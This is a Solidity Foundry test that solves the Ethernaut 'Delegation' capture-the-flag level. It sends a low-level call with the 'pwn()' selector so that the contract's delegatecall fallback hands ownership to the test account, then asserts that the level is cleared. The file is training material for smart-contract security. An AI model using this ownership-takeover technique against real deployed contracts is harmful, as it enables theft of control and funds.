// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Delegation/Delegation.sol";
import "../src/levels/Delegation/DelegationFactory.sol";
import {Vm} from "forge-std/Vm.sol";

contract DelegationTest is DSTest {
    Ethernaut ethernaut;
    DelegationFactory delegationFactory;
    address eoa = address(69);
    Vm private constant vm = Vm(HEVM_ADDRESS);

    function setUp() public {
        ethernaut = new Ethernaut();
        delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.deal(eoa, 1 ether);
    }

    function testIsDelegationCleared() public {
        vm.startPrank(eoa);
        address instance = ethernaut.createLevelInstance(delegationFactory);
        instance.call(abi.encodeWithSignature("pwn()"));

        assertTrue(ethernaut.submitLevelInstance(payable(instance)));

        vm.stopPrank();
    }
}
